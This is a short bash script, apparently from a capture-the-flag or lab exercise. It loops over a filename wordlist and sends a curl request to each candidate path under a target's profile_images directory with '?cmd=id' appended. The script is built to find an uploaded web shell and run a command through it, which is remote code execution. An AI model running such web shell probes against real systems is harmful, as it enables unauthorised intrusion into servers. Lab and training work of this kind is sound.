#!/bin/bash
#usage: supply your filename wordlist with the execution of this script. It replaces each line with $line 
#./repeat.sh wordlist.txt

input=$1
while IFS= read -r line
do
        echo 'doing' $line':'
        curl -I http://83.136.254.167:42997/profile_images/$line?cmd=id
done < "$input"

